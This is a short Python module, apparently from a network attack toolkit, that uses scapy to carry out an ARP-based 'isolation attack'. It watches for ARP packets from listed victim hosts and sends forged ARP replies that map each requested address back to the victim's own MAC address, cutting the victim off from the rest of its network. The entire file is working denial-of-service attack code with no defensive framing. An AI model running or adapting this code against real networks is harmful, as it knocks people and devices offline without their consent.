from dataclasses import dataclass
from scapy.all import *
from util.dataclasses import Host, Interface

@dataclass
class IsolationAttackSettings:
    interface: Interface
    victims: list[Host]

def handle_packet_isolation(settings: IsolationAttackSettings, packet: Packet):
    if ARP not in packet:
        return

    for victim in settings.victims:
        if victim.ip_addr == packet[ARP].psrc:
            response = Ether() / ARP()
            response[Ether].src = settings.interface.mac_addr
            response[Ether].dst = victim.mac_addr
            response[ARP].psrc = packet[ARP].pdst
            response[ARP].pdst = victim.ip_addr
            response[ARP].hwsrc = victim.mac_addr
            response[ARP].hwdst = victim.mac_addr
            response[ARP].op = 2

            sendp(response, verbose=0, iface=settings.interface.name, count=3)

        return